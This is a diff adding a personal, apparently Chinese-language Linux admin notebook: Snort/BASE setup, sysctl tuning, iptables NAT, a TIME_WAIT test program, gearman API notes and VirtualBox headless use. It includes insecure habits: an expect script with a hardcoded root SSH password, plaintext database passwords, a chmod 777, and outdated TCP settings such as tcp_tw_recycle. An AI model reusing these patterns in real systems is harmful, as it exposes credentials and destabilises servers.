+#+begin_example
+# vi /etc/snort/snort.conf 
+
+output unified2: filename snort.u2, limit 128 
+#+end_example
+
+Installing barnyard2
+
+#+begin_example
+# cd /tmp ; wget http://www.securixlive.com/download/barnyard2/barnyard2-1.9.tar.gz 
+# tar -xzvf barnyard2-1.9.tar.gz 
+# cd barnyard2-1.9 
+# ./configure --with-mysql 
+# make && make install 
+# cp etc/barnyard2.conf /etc/snort/ 
+# mysql -u snort -psnortpassword snort < schemas/create_mysql 
+# touch /etc/snort/barnyard2.waldo 
+# chmod 777 /etc/snort/barnyard2.waldo 
+# chown snort:snort /etc/snort/barnyard2.waldo 
+#+end_example
+
+- Edit barnyard2 configuration:
+#+begin_example
+# vi /etc/snort/barnyard2.conf 
+
+config reference_file: /etc/snort/reference.config
+config classification_file: /etc/snort/classification.config
+config gen_file: /etc/snort/rules/gen-msg.map 
+config sid_file: /etc/snort/rules/sid-msg.map 
+input unified2 
+config hostname: localhost 
+config interface: eth0 
+config alert_with_interface_name 
+output database: log, mysql, user=snort password=snortpassword dbname=snort host=localhost 
+#+end_example
+
+Adapting our init script to work with barnyard2
+#+begin_example
+ # vi /etc/init.d/snortd 
+
+ # /etc/init.d/snortd restart 
+#+end_example
+Installing BASE
+#+begin_example
+# cd /tmp ; wget http://sourceforge.net/projects/secureideas/files/latest/download 
+# tar -xzvf base-1.4.5.tar.gz 
+# cp -r base-1.4.5/ /var/www/base 
+# cd /var/www/base/ 
+# cp base_conf.php.dist base_conf.php 
+#+end_example
+- Edit BASE scripts configuration:
+#+begin_example
+# vi base_conf.php 
+
+$BASE_urlpath = '/base'; 
+$DBlib_path = '/usr/share/php/adodb'; 
+$alert_dbname = 'snort'; 
+$alert_host = 'localhost'; 
+$alert_port = '3306'; 
+$alert_user = 'snort'; 
+$alert_password = 'snortpassword'; 
+#+end_example
+Configuring Apache
+
+#+begin_example
+# vi /etc/httpd/conf.d/base.conf 
+
+Alias /base /var/www/base/
+<directory "/var/www/base/"> 
+AllowOverride None 
+Order allow,deny 
+Allow from all 
+AuthName "Snort IDS"
+AuthType Basic 
+AuthUserFile /etc/snort/base.passwd
+Require valid-user 
+</directory> 
+#+end_example
+
+- Generating password file for web access for BASE:
+#+begin_example
+ # htpasswd -c /etc/snort/base.passwd snortadmin 
+#+end_example
+- Restart apache:
+#+begin_example
+ # service httpd restart 
+#+end_example
+
+Accessing to the BASE web environment
+
+http://IP-WEB-SERVER/base/base_db_setup.php
+
+and click create BASE AV
+
+* 修改屏幕背景色
+
+To set the "Paper Mode" use:
+xcalib -red 1.7 1 64 -green 1.7 1 57 -blue 1.7 1 28 -alter
+To (re)set back to "Screen Mode" use:
+xcalib -clear
+
+反转颜色
+xcalib -invert -alter
+* suse linux server黑屏
+在黑屏时。按Ctrl+Alt+F2进入另一个shell
+* 内核参数
+1.内核进程通信参数
+
+1）运行 ipcs -l 命令以列示当前的内核参数设置。
+2）分析命令输出， 通过将当前值与内核参数需求 (Linux) 中对版本 9.5 修订包 6 或更高版本修订包的增强最低设置进行比较，从而确定您是否必须更改内核设置。 下列文本是 ipcs 命令输出的示例，注释添加在 // 后面以显示参数名称：
+
+      # ipcs -l
+
+      ------ Shared Memory Limits --------
+
+      max number of segments = 4096               // SHMMNI 
+      max seg size (kbytes) = 32768               // SHMMAX
+      max total shared memory (kbytes) = 8388608  // SHMALL
+      min seg size (bytes) = 1
+
+ 
+
+      ------ Semaphore Limits --------
+      max number of arrays = 1024                 // SEMMNI
+      max semaphores per array = 250              // SEMMSL
+      max semaphores system wide = 256000         // SEMMNS
+      max ops per semop call = 32                 // SEMOPM
+      semaphore max value = 32767
+
+ 
+
+      ------ Messages: Limits --------
+      max queues system wide = 1024               // MSGMNI
+      max size of message (bytes) = 65536         // MSGMAX
+      default max size of queue (bytes) = 65536    // MSGMNB
+3）通过编辑 /etc/sysctl.conf 文件来修改您必须调整的内核参数。下列各行是该文件中应包含的内容的示例：
+# 具有 16GB RAM 的计算机的示例：
+kernel.shmmni=4096
+kernel.shmmax=17179869184
+kernel.shmall=8388608
+
+#kernel.sem=<SEMMSL> <SEMMNS> <SEMOPM> <SEMMNI>
+kernel.sem=250 256000 32 4096
+kernel.msgmni=16384
+kernel.msgmax=65536
+kernel.msgmnb=65536
+
+
+4）运行 sysctl 时附带 -p 参数
+
+ 
+2.内核网络参数
+
+
+进入SYN包的最大请求队列.默认1024.对重负载服务器,可调整
+
+net.ipv4.tcp_max_syn_backlog = 65536
+
+ 
+
+进入包的最大设备队列.默认是300,对重负载服务器而言,该值太低,可调整
+
+net.core.netdev_max_backlog =  32768
+
+ 
+
+listen()的默认参数,挂起请求的最大数量.默认是128.对繁忙的服务器,增加该值有助于网络性能.可调整
+
+net.core.somaxconn = 32768
+
+ 
+
+表示发送套接字缓冲区大小的缺省值（以字节为单位）
+
+net.core.wmem_default = 8388608        
+
+ 
+
+表示接收套接字缓冲区大小的缺省值（以字节为单位）
+
+net.core.rmem_default = 8388608
+
+ 
+
+最大socket读buffer,可参考的优化值：873200
+
+net.core.rmem_max = 16777216
+
+ 
+
+最大socket写buffer,可参考的优化值：873200
+
+net.core.wmem_max = 16777216  
+
+ 
+
+时间戳可以避免序列号的卷绕。一个1Gbps的链路肯定会遇到以前用过的序列号。时间戳能够让内核接受这种"异常"的数据包。这里需要将其关掉。
+
+net.ipv4.tcp_timestamps = 0
+
+ 
+
+为了打开对端的连接，内核需要发送一个SYN并附带一个回应前面一个SYN的ACK.也就是所谓三次握手中的第二次#握手。这个设置决定了内核放弃连接之前发送SYN+ACK包的数量
+
+net.ipv4.tcp_synack_retries = 2
+
+ 
+
+在内核放弃建立连接之前发送SYN包的数量
+
+net.ipv4.tcp_syn_retries = 2
+
+ 
+
+表示开启TCP连接中TIME-WAIT sockets的快速回收，默认为0,表示关闭
+
+net.ipv4.tcp_tw_recycle = 1
+
+ 
+net.ipv4.tcp_tw_len = 1
+
+ 
+
+表示开启重用。允许将TIME-WAIT sockets重新用于新的TCP连接，默认为0,表示关闭；
+
+net.ipv4.tcp_tw_reuse = 1
+
+ 
+
+net.ipv4.tcp_mem = 94500000 915000000 927000000
+
+#net.ipv4.tcp_mem[0]:低于此值，TCP没有内存压力。   
+
+#net.ipv4.tcp_mem[1]:在此值下，进入内存压力阶段。   
+
+#net.ipv4.tcp_mem[2]:高于此值，TCP拒绝分配socket
+
+ 
+
+系统中最多有多少个TCP套接字不被关联到任何一个用户文件句柄上。如果超过这个数字，连接将即刻被复位并打#印出警告信息。这个限制仅仅是为了防止简单的DoS攻击，不能过分依靠它或者人为地减小这个值，更应该增加这个值（如果增加了内存之后）。
+
+net.ipv4.tcp_max_orphans = 3276800
+
+ 
+
+#net.ipv4.tcp_fin_timeout = 30
+
+#net.ipv4.tcp_keepalive_time = 120
+
+ 
+
+表示用于向外连接的端口范围。缺省情况下很小
+
+net.ipv4.ip_local_port_range = 1024  65535
+
+ 
+
+代表机器跟踪连接的数目
+
+net.ipv4.ip_conntrack_max=655360
+
+net.ipv4.netfilter.ip_conntrack_max=655360
+
+net.nf_conntrack_max=655360
+
+net.netfilter.nf_conntrack_max=655360
+* iptables NAT配置
+** SNAT：源地址转换
+目标地址不变，重新改写源地址，并在本机建立NAT表项，当数据返回时，根据NAT表将目的地址数据改写为数据发送出去时候的源地址，并发送给主机
+目前大多都是解决内网用户用同一个公网地址上网的情况
+
+** DNAT：目标地址转换
+
+和SNAT相反，源地址不变，重新修改目标地址，在本机建立NAT表项，当数据返回时，根据NAT表将源地址修改为数据发送过来时的目标地址，并发给远程主机
+在DNAT的基础上，可以根据请求数据包的端口做PNAT（端口转换，也称为端口映射），可以更句请求数据包不同的端口改写不同的目标地址，从而发送给不同的主机
+这在用一个公网地址做不同服务时用的比较多，而且相对来说，用NAT的方式可以隐藏后端服务器的真实地址，更加的安全
+
+完成nat的实现，数据要经过prerouting—forword--postrouting这3个链
+
+** SNAT的数据流向过程
+
+首先进入prerouting，发现不是本网段的地址，而后开始查找路由表（查找路由的过程在prerouting和forword之间），
+于是经过forword链进行转发，在通过postrouting时进行NAT转换。
+在这个流程中，NAT转换的步骤在postrouting链上实现，之所以不再prerouting上做nat是因为数据包在进来之前，还不知道是本网段地址还是外网地址
+ 
+** DNAT的数据流向过程
+
+在DNAT中，NAT要在prerouting链上做。之前提到过，在数据进入主机后，路由选择过程是在prerouting和forword之间的，
+所以应该先做地址转换之后，再进行路由选择，而后经过forword，最后从postrouting出去
+
+** SNAT 实验
+
+*在做nat之前，要先把路由功能打开，不然数据包连forword都过不了*
+
+[root@localhost ~]# echo 1 > /proc/sys/net/ipv4/ip_forward
+
+添加nat表项
+[root@localhost ~]# iptables -t nat -A POSTROUTING -s 172.16.93.0/24  -j SNAT --to-source 10.0.0.1
+表示在postrouting链上，将源地址为172.16.93.0/24网段的数据包的源地址都转换为10.0.0.1
+
+** 删除
+   iptables -L -t nat --line-numbers
+   使用--line-numbers显示chain-num
+
+   iptables -t nat -D POSTROUTING 1 
+   删除chain-num为1的规则
+** DNAT
+ 
+在DNAT中，要把规则定义在PREROUTING链中
+
+iptables -t nat -A PREROUTING -d 10.0.0.1 -j DNAT –-to-destination 172.16.93.1
+此条规则将请求IP为10.0.0.1的数据包转发到后端172.16.93.1主机上
+
+iptables -t nat -A PREROUTING -d 10.0.0.1 -p tcp –-dport 80 -j DNAT –-to-destination 172.16.93.1
+此条规则将请求IP为10.0.0.1并且端口为80的数据包转发到后端的172.16.93.1主机上，通过定义不同的端口，就可以实现PNAT，将同一个IP不同的端口请求转发到后端不同的主机
+
+iptables -t nat -A PREROUTING -d 10.0.0.1 -p tcp –-dport 80 -j DNAT –-to-destination 172.16.93.1:8080
+此条规则在上条规则的基础上，发往后端的数据包的目标端口改为8080，在后端主机的web服务器上使用8080端口接收访问， 这样能更好的保护后端主机
+
+** 使用SNAT上网
+公司上外网需要进入windows域，而且有各种限制。
+所以同事就采用了SNAT在一台有外网IP的机器上设置上网代理
+
+
+其中172.16.132.189是可以直接通过路由器上网的IP
+我们在eth0:1上设置虚IP 192.168.0.86
+
+linux-19:~ # ifconfig
+eth0      Link encap:Ethernet  HWaddr 00:1E:4F:37:40:B3  
+          inet addr:172.16.132.189  Bcast:172.16.132.189  Mask:255.255.255.0
+          inet6 addr: fe80::21e:4fff:fe37:40b3/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:673852 errors:0 dropped:4 overruns:0 frame:0
+          TX packets:532089 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:84927257 (80.9 Mb)  TX bytes:290095285 (276.6 Mb)
+          Interrupt:16 Memory:f8000000-f8012800 
+
+eth0:1    Link encap:Ethernet  HWaddr 00:1E:4F:37:40:B3  
+          inet addr:192.168.0.86  Bcast:192.168.0.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          Interrupt:16 Memory:f8000000-f8012800 
+
+eth1      Link encap:Ethernet  HWaddr 00:1E:4F:37:40:B5  
+          inet addr:10.0.64.19  Bcast:10.0.64.255  Mask:255.255.255.0
+          inet6 addr: fe80::21e:4fff:fe37:40b5/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:48566313 errors:0 dropped:215 overruns:0 frame:0
+          TX packets:46589089 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:19627285431 (18718.0 Mb)  TX bytes:13694263195 (13059.8 Mb)
+          Interrupt:16 Memory:f4000000-f4012800 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:26472624 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:26472624 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:5729228159 (5463.8 Mb)  TX bytes:5729228159 (5463.8 Mb)
+
+代理通过路由器172.16.132.3上网
+linux-19:~ # route
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+default         172.16.132.3    0.0.0.0         UG    0      0        0 eth0
+10.0.64.0       *               255.255.255.0   U     0      0        0 eth1
+loopback        *               255.0.0.0       U     0      0        0 lo
+172.16.132.0    *               255.255.255.0   U     0      0        0 eth0
+192.168.0.0     *               255.255.255.0   U     0      0        0
+
+配置SNAT的结果
+
+10.0.64.0/24是一个内部服务器网络，仍然需要访问，
+所以第一条策略单独配置了。
+linux-19:~ # iptables -L -n -t nat
+...
+Chain POSTROUTING (policy ACCEPT)
+target     prot opt source               destination         
+SNAT       all  --  0.0.0.0/0            10.0.0.0/8          to:10.0.64.19 
+SNAT       all  --  192.168.0.0/24       0.0.0.0/0           to:172.16.132.189 
+SNAT       all  --  192.168.86.0/24      0.0.0.0/0           to:172.16.132.189 
+SNAT       all  --  192.168.100.0/24     0.0.0.0/0           to:172.16.132.189
+
+
+最后，我使用的机器将IP设置为192.168.0.109，网关设置为192.168.0.86
+现在就可以自由的上网了。
+
+* TIME_WAIT状态是否占用文件描述符
+
+Each socket in TIME_WAIT consumes some memory in the kernel, usually somewhat less than an ESTABLISHED socket yet still significant. A sufficiently large number could exhaust kernel memory, or at least degrade performance because that memory could be used for other purposes. TIME_WAIT sockets do not hold open file descriptors (assuming they have been closed properly), so you should not need to worry about a "too many open files" error.
+
+The socket also ties up that particular src/dst IP address and port so it cannot be reused for the duration of the TIME_WAIT interval. (This is the intended purpose of the TIME_WAIT state.) Tying up the port is not usually an issue unless you need to reconnect a with the same port pair. Most often one side will use an ephemeral port, with only one side anchored to a well known port. However, a very large number of TIME_WAIT sockets can exhaust the ephemeral port space if you are repeatedly and frequently connecting between the same two IP addresses. Note this only affects this particular IP address pair, and will not affect establishment of connections with other hosts.
+
+编写测试程序链接建立一个TCP链接，然后断开该链接，如此反复。
+不断创建TIME_WAIT状态的socket。
+#+begin_src c
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <stdio.h>
+#include <strings.h>
+
+int main(int argc,char *args[])
+{
+    int socket_descriptor;
+    int port = 8080;
+    struct sockaddr_in pin;
+    int count = 0;
+    while(1) {
+        pin.sin_family = AF_INET;
+        pin.sin_addr.s_addr = inet_addr("10.0.64.18");
+        pin.sin_port = htons(port);
+        bzero(&(pin.sin_zero), 8);
+
+        socket_descriptor = socket(AF_INET, SOCK_STREAM, 0);
+        if(connect(socket_descriptor, (void *)&pin, sizeof(pin))==-1)
+        {
+            perror("connect");
+        }
+        close(socket_descriptor);
+        count++;
+        if(count%1000 == 1) {
+            sleep(1);
+        }
+    }
+    return 0;
+}
+#+end_src
+
+然后查看打开文件句柄数
+cat /proc/sys/fs/file-nr
+(file-nr含义见Documentation/filesystems/proc.txt)
+代码见file_table.c: int proc_nr_files(...)
+发现file-nr并不增长
+
+
+将生成TIME_WAIT频率加快。
+connect就是返回错误信息
+connect: Cannot assign requested address
+
+由于占用的端口号超过了61000-32768
+net.ipv4.ip_local_port_range = 32768	61000
+
+
+TIME_WAIT不占用file-nr的原因:
+在于用户态程序调用了close()
+sys_close()调用，释放了file描述符，
+sys_close()->filp_close()->fput()
+* ifconfig看不到ip命令设置的地址
+  ip addr show
+* strace 看libxx.so加载的路径
+  ./network_monitor: error while loading shared libraries: libutils.so: cannot open shared object file: No such file or directory
+
+  strace ./network_monitor
+* HTTPS的工作原理
+HTTPS在传输数据之前需要客户端（浏览器）与服务端（网站）之间进行一次握手，在握手过程中将确立双方加密传输数据的密码信息。
+TLS/SSL协议不仅仅是一套加密传输的协议，更是一件经过艺术家精心设计的艺术品，TLS/SSL中使用了非对称加密，对称加密以及HASH算法。握手过程的简单描述如下：
+1.浏览器将自己支持的一套加密规则发送给网站。
+2.网站从中选出一组加密算法与HASH算法，并将自己的身份信息以证书的形式发回给浏览器。证书里面包含了网站地址，加密公钥，以及证书的颁发机构等信息。
+3.获得网站证书之后浏览器要做以下工作：
+a) 验证证书的合法性（颁发证书的机构是否合法，证书中包含的网站地址是否与正在访问的地址一致等），如果证书受信任，则浏览器栏里面会显示一个小锁头，否则会给出证书不受信的提示。
+b) 如果证书受信任，或者是用户接受了不受信的证书，浏览器会生成一串随机数的密码，并用证书中提供的公钥加密。
+c) 使用约定好的HASH计算握手消息，并使用生成的随机数对消息进行加密，最后将之前生成的所有信息发送给网站。
+4.网站接收浏览器发来的数据之后要做以下的操作：
+a) 使用自己的私钥将信息解密取出密码，使用密码解密浏览器发来的握手消息，并验证HASH是否与浏览器发来的一致。
+b) 使用密码加密一段握手消息，发送给浏览器。
+5.浏览器解密并计算握手消息的HASH，如果与服务端发来的HASH一致，此时握手过程结束，之后所有的通信数据将由之前浏览器生成的随机密码并利用对称加密算法进行加密。
+* python matplotlib画图
+* gearman
+Client API
+
+client初始化&析构
+
+gearman_client_st *gearman_client_create(gearman_client_st *client)
+
+void gearman_client_free(gearman_client_st *client)
+
+gearman_return_t gearman_client_add_server(gearman_client_st *client, const char *host, in_port_t port);
+
+gearman_return_t gearman_client_add_servers(gearman_client_st *client, const char *servers); (一次添加多个gearman job-server)
+
+
+同步操作
+
+void * gearman_client_do(gearman_client_st *client, const char *function_name, const char *unique, const void *workload, size_t workload_size, size_t *result_size, gearman_return_t *ret_ptr);
+
+其中：
+
+i. unique: 的作用是client添加job给worker的时候的一个唯一标识，可选，默认是NULL
+
+ii. workload & workload_size指代执行任务的详细参数及其大小
+
+iii. result_size [out]，指代返回数据的大小
+
+iv. ret_ptr [out], 指代gearman的返回status，以下是官方对于返回status的一些说明：
+
+In the case of GEARMAN_WORK_DATA, GEARMAN_WORK_WARNING, or GEARMAN_WORK_STATUS, the caller should take any actions to handle the event and then call this function again. This may happen multiple times until a GEARMAN_WORK_ERROR, GEARMAN_WORK_FAIL, or GEARMAN_SUCCESS (work complete) is returned. For GEARMAN_WORK_DATA or GEARMAN_WORK_WARNING, the result_size will be set to the intermediate data chunk being returned and an allocated data buffer will be returned. For GEARMAN_WORK_STATUS, the caller can use gearman_client_do_status() to get the current tasks status.
+
+总而言之，只有GEARMAN_WORK_ERROR/GEARMAN_WORK_FAIL/GEARMAN_SUCCESS才是三个最终的返回结果，其他的只是临时中间结果，需要进一步调用接受结果的函数(感觉中间结果只有在异步调用过程中才会出现)
+
+v. 输出是返回数据的起始地址，一旦用户用完之后，必须free，否则会出现内存泄露。
+
+void gearman_set_timeout(gearman_universal_st *gearman, int timeout);
+
+设置gearman_client_do多长时调用无返回则超时时间
+
+
+异步callback操作
+
+Gearman通过使用gearman_client_add_task()来望gearman_client_st中添加task，通过gearman_client_set_created_fn() / gearman_client_set_complete_fn()
+等来注册callback function，通过gearman_client_run_tasks()来运行gearman_client_st中的task。
+
+
+异步background操作
+
+系统在background运行job，client定期获得job运行结果，如果成功则返回，反之则继续等待。
+
+gearman_return_t gearman_client_do_background(gearman_client_st *client, 
+            const char *function_name, const char *unique, const void *workload, size_t workload_size, char *job_handle);
+
+i. job_handle [out]: 一个job的标识符
+
+ii. 输出：返回状态
+
+ gearman_return_t gearman_client_job_status(gearman_client_st *client, 
+                                            gearman_job_handle_t job_handle,
+                                            bool *is_known, 
+                                            bool * is_running, 
+                                            uint32_t *numerator,
+                                            uint32_t *denominator);
+ 用户获得在background执行的job的状态
+
+i. is_known [out]: Optional parameter to store the known status in
+
+ii. is_running [out]: Optional parameter to store the running status in
+
+iii. numerator [out]: Optional parameter to store the numerator in
+
+iv. denominator [out]: Optional parameter to store the denominator in
+
+PS: 好像background操作不怎么好使，不知道如何通过获得background的运行结果，这个是我一直困惑的
+
+
+gearman_client_st的一些属性
+
+gearman_client_st一共有以下3种运行属性：
+
+i. GEARMAN_CLIENT_NON_BLOCKING: client运行在non-blocking mode
+
+ii. GEARMAN_CLIENT_FREE_TASKS: 在task执行完成之后，自动的释放task
+
+iii. GEARMAN_CLIENT_UNBUFFERED_RESULT: Allow the client to read data in chunks rather than have the library buffer the entire data result and pass that back。
+
+可以通过函数gearman_client_add_options() / gearman_client_remove_options() / gearman_client_has_option() 等进行属性添加/删除/判断等
+
+
+Worker API
+
+/**
+ * Initialize a worker structure. Always check the return value even if passing
+ * in a pre-allocated structure. Some other initialization may have failed. It
+ * is not required to memset() a structure before providing it.
+ *
+ * @param[in] worker Caller allocated structure, or NULL to allocate one.
+ * @return On success, a pointer to the (possibly allocated) structure. On
+ *  failure this will be NULL.
+ */
+GEARMAN_API
+gearman_worker_st *gearman_worker_create(gearman_worker_st *worker);
+
+
+/**
+ * Free resources used by a worker structure.
+ *
+ * @param[in] worker Structure previously initialized with
+ *  gearman_worker_create() or gearman_worker_clone().
+ */
+GEARMAN_API
+void gearman_worker_free(gearman_worker_st *worker);
+
+
+/**
+ * Add a job server to a worker. This goes into a list of servers that can be
+ * used to run tasks. No socket I/O happens here, it is just added to a list.
+ *
+ * @param[in] worker Structure previously initialized with
+ *  gearman_worker_create() or gearman_worker_clone().
+ * @param[in] host Hostname or IP address (IPv4 or IPv6) of the server to add.
+ * @param[in] port Port of the server to add.
+ * @return Standard gearman return value.
+ */
+GEARMAN_API
+gearman_return_t gearman_worker_add_server(gearman_worker_st *worker,
+                                           const char *host, in_port_t port);
+
+
+/**
+ * Add a list of job servers to a worker. The format for the server list is:
+ * SERVER[:PORT][,SERVER[:PORT]]...
+ * Some examples are:
+ * 10.0.0.1,10.0.0.2,10.0.0.3
+ * localhost LIBGEARMAN_BITFIELD234,jobserver2.domain.com:7003,10.0.0.3
+ *
+ * @param[in] worker Structure previously initialized with
+ *  gearman_worker_create() or gearman_worker_clone().
+ * @param[in] servers Server list described above.
+ * @return Standard gearman return value.
+ */
+GEARMAN_API
+gearman_return_t gearman_worker_add_servers(gearman_worker_st *worker,
+                                            const char *servers);
+                                            
+/**
+ * Register and add callback function for worker. To remove functions that have
+ * been added, call gearman_worker_unregister() or
+ * gearman_worker_unregister_all().
+ *
+ * @param[in] worker Structure previously initialized with
+ *  gearman_worker_create() or gearman_worker_clone().
+ * @param[in] function_name Function name to register.
+ * @param[in] timeout Optional timeout (in seconds) that specifies the maximum
+ *  time a job should. This is enforced on the job server. A value of 0 means
+ *  an infinite time.
+ * @param[in] function Function to run when there is a job ready.
+ * @param[in] context Argument to pass into the callback function.
+ * @return Standard gearman return value.
+ */
+GEARMAN_API
+gearman_return_t gearman_worker_add_function(gearman_worker_st *worker,
+                                             const char *function_name,
+                                             uint32_t timeout,
+                                             gearman_worker_fn *function,
+                                             void *context);
+
+
+/**
+ * Wait for a job and call the appropriate callback function when it gets one.
+ *
+ * @param[in] worker Structure previously initialized with
+ *  gearman_worker_create() or gearman_worker_clone().
+ * @return Standard gearman return value.
+ */
+GEARMAN_API
+gearman_return_t gearman_worker_work(gearman_worker_st *worker);
+
+
+/**
+ * See gearman_universal_set_timeout() for details.
+ */
+GEARMAN_API
+void gearman_worker_set_timeout(gearman_worker_st *worker, int timeout);
+* Linux下程序无core文件定位程序崩溃的方法
+
+Linux平台下运行程序，程序出错core掉，设置了ulimit -c会产生core文件，根据生成的core文件和程序很容易定位程序哪里出了问题。如果在生产环境，可能会存在以下几种情况不能生成core文件
+    忘记设置ulimit -c
+    生成的core文件太大，磁盘不能写入，或者磁盘空间已满
+    误删除
+    其它
+
+如果出现了不能产生core文件的情况，可以通过以下两种方法定位：
+
+1.addr2line方法
+
+如果我们在编译的时候加了-g，可以直接用addr2line直接定位到程序哪一行出错了
+
+备注: 08048484是程序core掉时的EIP值，通过系统日志获取形式如下
+
+Sep  3 10:15:46 localhost kernel: a.out[19254]: segfault at 0 ip 08048484 sp bfa86ff0 error 6 in a.out[8048000+1000]
+
+命令:
+   addr2line -e a.out 08048484
+
+运行结果:
+   /home/woody/demo/testcore.cpp:6
+
+2.如果在编译的时候没有加上-g选项，addr2line就不起作用了，这时可以通过反汇编可执行程序定位
+命令：
+   objdump -d a.out > a.asm
+打开生成的汇编文件a.asm
+* 自动登录ssh
+  由于最近每天都使用ssh登录到服务器上调试程序，
+  看N多SSH窗口，每次都输入密码，累。
+  于是使用expect,写脚本如下：
+#+begin_example
+#!/usr/bin/expect -f
+set ip 10.0.64.18
+set password root
+set timeout 10
+spawn ssh root@$ip
+expect {
+    "*yes/no" { send "yes\r"; exp_continue}
+    "*password:" { send "$password\r" }
+}
+expect "#*"
+#进入代码目录
+send "cd /home/yxf/Compile/code/HSS\r"
+#交互模式,用户会停留在远程服务器上面.
+interact
+#+end_example
+* svn 批量添加啊
+    svn st | awk '{if ( $1 == "?") { print $2}}' | xargs svn add  
+* gnome mount sftp
+  在同步本地源码和ssh服务器上的代码时，
+  可以使用gnome, file->connect to server
+  将ssh的文件mount到本地，使用beycond compare进行对比
+* linux svn图形工具
+  rabbitvcs
+* How to create and start VirtualBox VM without GUI
+** Prerequisite for starting VirtualBox VM without GUI
+
+First, you need to install VirtualBox Extension Pack. The Extension Pack is needed to run a VRDE remote desktop server used to access headless VMs. Its binary is available for free. To download and install VirtualBox Extension Pack:
+$ wget http://download.virtualbox.org/virtualbox/4.2.12/Oracle_VM_VirtualBox_Extension_Pack-4.2.12-84980.vbox-extpack
+$ sudo VBoxManage extpack install ./Oracle_VM_VirtualBox_Extension_Pack-4.2.12-84980.vbox-extpack
+
+Verify that the Extension Pack is successfully installed, by using the following command.
+$ VBoxManage list extpacks
+
+Extension Packs: 1
+Pack no. 0:   Oracle VM VirtualBox Extension Pack
+Version:      4.2.12
+Revision:     84980
+Edition:      
+Description:  USB 2.0 Host Controller, VirtualBox RDP, PXE ROM with E1000 support.
+VRDE Module:  VBoxVRDP
+Usable:       true 
+Why unusable: 
+
+** Create a VirtualBox VM from the command line
+
+I assume that the VirtualBox' VM directory is located in "~/VirtualBox\ VMs".
+
+First create a VM. The name of the VM is "testvm" in this example.
+$ VBoxManage createvm --name "testvm" --register
+
+Specify the hardware configurations of the VM (e.g., Ubuntu OS type, 1024MB memory, bridged networking, DVD booting).
+$ VBoxManage modifyvm "testvm" --memory 1024 --acpi on --boot1 dvd --nic1 bridged --bridgeadapter1 eth0 --ostype Ubuntu
+
+Create a disk image (with size of 10000 MB). Optionally, you can specify disk image format by using "--format [VDI|VMDK|VHD]" option. Without this option, VDI image format will be used by default.
+$ VBoxManage createvdi --filename ~/VirtualBox\ VMs/testvm/testvm-disk01.vdi --size 10000
+
+Add an IDE controller to the VM.
+$ VBoxManage storagectl "testvm" --name "IDE Controller" --add ide
+
+Attach the previously created disk image as well as CD/DVD drive to the IDE controller. Ubuntu installation ISO image (found in /iso/ubuntu-12.04.1-server-i386.iso) is then inserted to the CD/DVD drive.
+$ VBoxManage storageattach "testvm" --storagectl "IDE Controller" --port 0 --device 0 --type hdd --medium ~/VirtualBox\ VMs/testvm/testvm-disk01.vdi
+$ VBoxManage storageattach "testvm" --storagectl "IDE Controller" --port 1 --device 0 --type dvddrive --medium /iso/ubuntu-12.04.1-server-i386.iso
+
+** Start VirtualBox VM from the command line
+
+Once a new VM is created, you can start the VM headless (i.e., without VirtualBox console GUI) as follows.
+$ VBoxHeadless --startvm "testvm" &
+
+The above command will launch the VM, as well as VRDE remote desktop server. The remote desktop server is needed to access the headless VM's console.
+
+By default, the VRDE server is listening on TCP port 3389. If you want to change the default port number, use "-e" option as follows.
+$ VBoxHeadless --startvm "testvm" -e "TCP/Ports=4444" &
+
+If you don't need remote desktop support, launch a VM with "--vrde off" option.
+$ VBoxHeadless --startvm "testvm" --vrde off &
+
+** Connect to headless VirtualBox VM via remote desktop
+
+Once a VM is launched with remote desktop support, you can access the VM's console via any remote desktop client (e.g., rdesktop).
+
+To install rdesktop on Ubuntu or Debian:
+$ sudo apt-get install rdesktop
+
+To install rdesktop on CentOS, RHEL or Fedora, configure Repoforge on your system, and then run the following.
+$ sudo yum install rdesktop
+
+To access a headless VM on a remote host machine, run the following.
+$ rdesktop -a 16 <IP_address_host_machine>
+
+If you use a custom port number for a remote desktop server, run the following instead.
+$ rdesktop -a 16 <IP_address_host_machine:port_number>
+
+Once rdesktop is successfully connected to the VM via remote desktop, you will see the initial installation screen.
+* nginx用光local port
+2014/04/24 12:22:53 [crit] 1120#0: *17024380925 connect() to 192.168.2.150:8088 failed (99: Cannot assign requested address) while connecting to upstream, client: 123.14.145.99, server: , request: "POST /aaa/app_signon HTTP/1.1", upstream: "http://192.168.2.150:8088/aaaopenapi?action=aaa&cmd=app_signon", host: "api.hismarttv.com:8080"
+
+需要调整net.ipv4.ip_local_port_range参数
